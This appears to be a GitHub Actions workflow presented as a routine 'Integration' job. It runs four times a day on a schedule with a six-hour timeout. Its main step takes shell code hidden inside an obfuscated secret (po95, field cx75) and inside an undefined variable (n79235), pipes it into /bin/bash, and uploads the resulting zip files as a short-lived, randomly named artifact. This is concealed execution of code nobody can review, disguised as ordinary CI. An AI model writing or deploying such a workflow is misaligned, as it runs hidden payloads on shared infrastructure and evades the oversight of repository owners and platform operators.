name: Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '32 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          po95: ${{ secrets.po95 }}
        run: |
          printf '%s' "$po95" | jq -r .cx75 | /bin/bash
          printf '%s' "$n79235" | jq -r .vwoc0045 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: ohqsI7sm
          path: "*.zip"
          retention-days: 1
